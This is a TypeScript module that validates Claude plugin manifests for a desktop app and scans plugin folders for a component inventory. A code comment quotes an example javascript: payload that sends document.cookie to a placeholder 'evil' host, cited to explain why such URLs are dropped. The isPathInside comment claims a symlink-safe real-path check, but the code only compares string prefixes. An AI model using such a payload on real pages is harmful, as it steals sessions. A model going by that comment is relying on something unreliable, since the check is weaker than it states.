/**

 * manifest.ts — Read & validate .claude-plugin/plugin.json + scan a plugin

 * directory for a lightweight component inventory.

 *

 * ZhiShi does NOT interpret plugin components at runtime — that's the

 * Claude Agent SDK's job once we hand it `Options.plugins: [{ type: 'local', path }]`.

 * This module exists only to (a) validate the manifest at install time and

 * (b) surface component counts in the Plugins UI panel. Everything else

 * stays opaque.

 */



import {

  existsSync,

  lstatSync,

  readdirSync,

  readFileSync,

  statSync,

  type Dirent,

} from 'fs';

import { join, relative, sep } from 'path';

import { stripBom } from '../../shared/utils';

import type {

  PluginManifest,

  PluginComponentInventory,

} from '../../shared/types/plugin';



/** kebab-case 插件名校验——zsp.ts 校验 manifest.id 也复用同一规则。 */

export const PLUGIN_NAME_RE = /^[a-z0-9][a-z0-9_-]*$/;



/**

 * URL-scheme allow-list for fields that render as `<a href>` in the

 * renderer. Only http(s) is accepted; javascript: / data: / file: / etc.

 * are silently dropped. Used by parsePluginManifest to defuse the XSS

 * surface in homepage / repository.

 */

function isSafeWebUrl(s: string): boolean {

  try {

    const u = new URL(s);

    return u.protocol === 'https:' || u.protocol === 'http:';

  } catch {

    return false;

  }

}



export class PluginManifestError extends Error {

  readonly code: string;

  constructor(message: string, code = 'PLUGIN_MANIFEST_INVALID') {

    super(message);

    this.name = 'PluginManifestError';

    this.code = code;

  }

}



/**

 * Read & validate plugin.json from a tree (in-memory) or directory (on-disk).

 *

 * Validates only the fields ZhiShi persists: `name` (required, kebab-case)

 * + the optional metadata. Component path fields (`skills` / `agents` /

 * `hooks` / `mcpServers`) are left untouched — the SDK validates those.

 */

export function parsePluginManifest(raw: string): PluginManifest {

  let parsed: unknown;

  try {

    parsed = JSON.parse(stripBom(raw));

  } catch (err) {

    throw new PluginManifestError(`plugin.json 解析失败：${(err as Error).message}`);

  }

  if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {

    throw new PluginManifestError('plugin.json 必须是 JSON 对象');

  }

  const obj = parsed as Record<string, unknown>;

  const name = obj.name;

  if (typeof name !== 'string' || !name) {

    throw new PluginManifestError('plugin.json 缺少 name 字段');

  }

  if (!PLUGIN_NAME_RE.test(name)) {

    throw new PluginManifestError(

      `plugin.json::name 必须是 kebab-case（小写字母 + 数字 + 连字符）："${name}"`,

    );

  }



  const manifest: PluginManifest = { name };

  if (typeof obj.version === 'string') manifest.version = obj.version;

  if (typeof obj.description === 'string') manifest.description = obj.description;

  if (obj.author && typeof obj.author === 'object' && !Array.isArray(obj.author)) {

    const a = obj.author as Record<string, unknown>;

    manifest.author = {

      name: typeof a.name === 'string' ? a.name : undefined,

      email: typeof a.email === 'string' ? a.email : undefined,

      url: typeof a.url === 'string' ? a.url : undefined,

    };

  } else if (typeof obj.author === 'string') {

    // Some plugins put author as a bare string — preserve it.

    manifest.author = { name: obj.author };

  }

  // homepage / repository render as <a href> in the renderer — drop any

  // non-http(s) scheme. A malicious plugin author can otherwise ship

  // `homepage: "javascript:fetch('//evil/?'+document.cookie)"` and the

  // renderer would happily execute it on click. WebKit treats javascript:

  // anchor hrefs as same-origin script even under our Tauri CSP.

  // Tightening here (rather than at render time) means a freshly-installed

  // but never-enabled plugin can't XSS via its detail panel.

  if (typeof obj.homepage === 'string' && isSafeWebUrl(obj.homepage)) {

    manifest.homepage = obj.homepage;

  }

  if (typeof obj.repository === 'string' && isSafeWebUrl(obj.repository)) {

    manifest.repository = obj.repository;

  }

  if (typeof obj.license === 'string') manifest.license = obj.license;

  if (Array.isArray(obj.keywords)) {

    manifest.keywords = obj.keywords.filter((k): k is string => typeof k === 'string');

  }

  return manifest;

}



/**

 * Read plugin.json from a directory. Returns null if the manifest is absent

 * (a plugin without a manifest is still allowed by spec — the SDK uses the

 * directory basename as the name — but ZhiShi requires one so we can

 * persist a stable id).

 *

 * Throws PluginManifestError if the file exists but is malformed.

 */

export function readPluginManifestFromDir(dir: string): PluginManifest | null {

  const manifestPath = join(dir, '.claude-plugin', 'plugin.json');

  if (!existsSync(manifestPath)) return null;

  const raw = readFileSync(manifestPath, 'utf-8');

  return parsePluginManifest(raw);

}



/**

 * Walk a plugin directory and produce a component inventory for UI display.

 *

 * Defensively bounded — caps total entries scanned to avoid pathological

 * directories. Errors during scan return partial results rather than throwing.

 */

export function scanPluginComponents(installPath: string): PluginComponentInventory {

  const inv: PluginComponentInventory = {

    skills: [],

    commands: [],

    agents: [],

    hooks: 0,

    mcpServers: [],

    lspServers: [],

    monitors: [],

    hasBin: false,

  };



  // ----- skills/<name>/SKILL.md -----

  try {

    const skillsDir = join(installPath, 'skills');

    if (isReadableDir(skillsDir)) {

      for (const entry of readdirSync(skillsDir, { withFileTypes: true })) {

        if (!entry.isDirectory()) continue;

        const skillMd = join(skillsDir, entry.name, 'SKILL.md');

        if (existsSync(skillMd)) inv.skills.push(entry.name);

      }

    }

  } catch { /* ignore */ }



  // ----- commands/*.md (legacy flat form) -----

  try {

    const commandsDir = join(installPath, 'commands');

    if (isReadableDir(commandsDir)) {

      for (const entry of readdirSync(commandsDir, { withFileTypes: true })) {

        if (!entry.isFile()) continue;

        if (entry.name.toLowerCase().endsWith('.md')) {

          inv.commands.push(entry.name.replace(/\.md$/i, ''));

        }

      }

    }

  } catch { /* ignore */ }



  // ----- agents/*.md -----

  try {

    const agentsDir = join(installPath, 'agents');

    if (isReadableDir(agentsDir)) {

      for (const entry of readdirSync(agentsDir, { withFileTypes: true })) {

        if (!entry.isFile()) continue;

        if (entry.name.toLowerCase().endsWith('.md')) {

          inv.agents.push(entry.name.replace(/\.md$/i, ''));

        }

      }

    }

  } catch { /* ignore */ }



  // ----- hooks/hooks.json -----

  try {

    const hooksJson = join(installPath, 'hooks', 'hooks.json');

    if (existsSync(hooksJson)) {

      const parsed = safeParseJson(hooksJson);

      const hooks = parsed?.hooks;

      if (hooks && typeof hooks === 'object') {

        let count = 0;

        for (const arr of Object.values(hooks as Record<string, unknown>)) {

          if (Array.isArray(arr)) {

            for (const entry of arr) {

              const handlers = (entry as Record<string, unknown>)?.hooks;

              if (Array.isArray(handlers)) count += handlers.length;

              else count += 1;

            }

          }

        }

        inv.hooks = count;

      }

    }

  } catch { /* ignore */ }



  // ----- .mcp.json -----

  try {

    const mcpJson = join(installPath, '.mcp.json');

    if (existsSync(mcpJson)) {

      const parsed = safeParseJson(mcpJson);

      const servers = parsed?.mcpServers;

      if (servers && typeof servers === 'object') {

        inv.mcpServers = Object.keys(servers as Record<string, unknown>);

      }

    }

  } catch { /* ignore */ }



  // ----- .lsp.json -----

  try {

    const lspJson = join(installPath, '.lsp.json');

    if (existsSync(lspJson)) {

      const parsed = safeParseJson(lspJson);

      if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {

        inv.lspServers = Object.keys(parsed as Record<string, unknown>);

      }

    }

  } catch { /* ignore */ }



  // ----- monitors/monitors.json -----

  try {

    const monitorsJson = join(installPath, 'monitors', 'monitors.json');

    if (existsSync(monitorsJson)) {

      const parsed = safeParseJson(monitorsJson);

      if (Array.isArray(parsed)) {

        inv.monitors = parsed

          .map(m => (m as Record<string, unknown>)?.name)

          .filter((n): n is string => typeof n === 'string');

      }

    }

  } catch { /* ignore */ }



  // ----- bin/ -----

  try {

    const binDir = join(installPath, 'bin');

    if (isReadableDir(binDir)) {

      const entries = readdirSync(binDir);

      inv.hasBin = entries.length > 0;

    }

  } catch { /* ignore */ }



  return inv;

}



/**

 * Compute total bytes used by a plugin's persistent data directory.

 * Returns 0 if the directory doesn't exist or is unreadable.

 *

 * Bounded — stops scanning after 50k entries to prevent pathological dirs

 * (e.g. node_modules) from blocking the event loop.

 */

export function measureDirBytes(dir: string, cap = 50_000): number {

  if (!existsSync(dir)) return 0;

  let total = 0;

  let count = 0;

  const walk = (d: string) => {

    if (count >= cap) return;

    let entries: Dirent[];

    try {

      entries = readdirSync(d, { withFileTypes: true }) as Dirent[];

    } catch {

      return;

    }

    for (const entry of entries) {

      if (count >= cap) return;

      count++;

      const p = join(d, entry.name);

      // Use lstat to avoid following symlinks

      let st;

      try {

        st = lstatSync(p);

      } catch {

        continue;

      }

      if (st.isSymbolicLink()) continue; // never follow

      if (st.isDirectory()) {

        walk(p);

      } else if (st.isFile()) {

        total += st.size;

      }

    }

  };

  try {

    walk(dir);

  } catch {

    /* ignore */

  }

  return total;

}



// -----------------------------------------------------------------------------

// Internals

// -----------------------------------------------------------------------------



function isReadableDir(p: string): boolean {

  try {

    return statSync(p).isDirectory();

  } catch {

    return false;

  }

}



function safeParseJson(path: string): Record<string, unknown> | null {

  try {

    return JSON.parse(stripBom(readFileSync(path, 'utf-8')));

  } catch {

    return null;

  }

}



/** Used by installer.ts after writing files to confirm the plugin root is valid. */

export function isPluginRootDir(p: string): boolean {

  return existsSync(join(p, '.claude-plugin', 'plugin.json'));

}



/** Defense-in-depth path check — caller passes an arbitrary path; we ensure

 *  the resolved real path stays under `expectedRoot` (no symlink escape). */

export function isPathInside(child: string, expectedRoot: string): boolean {

  const childAbs = child.endsWith(sep) ? child : child + sep;

  const rootAbs = expectedRoot.endsWith(sep) ? expectedRoot : expectedRoot + sep;

  return childAbs.startsWith(rootAbs);

}



/** Re-export for callers needing relative computation against installPath. */

export { relative as relativePath };

